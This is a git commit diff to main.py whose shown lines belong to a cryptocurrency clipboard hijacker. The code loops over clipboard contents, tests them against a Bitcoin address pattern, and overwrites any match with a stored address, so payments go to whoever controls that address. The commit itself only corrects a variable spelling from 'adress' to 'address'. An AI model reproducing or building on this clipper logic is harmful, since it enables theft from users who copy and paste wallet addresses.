68a3602a89771ea16dbc15553fa2c2399bfe1940
Forwall100 <78537089+Forwall100@users.noreply.github.com>
2021-07-12 22:41:44 +0700

    Update main.py

--- main.py
+++ main.py
@@ -29,4 +29,4 @@ while True:
     while True:
         if x != clipboard.paste():
             if re.match('^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$', clipboard.paste()) is not None:
-                clipboard.copy(adress)
+                clipboard.copy(address)
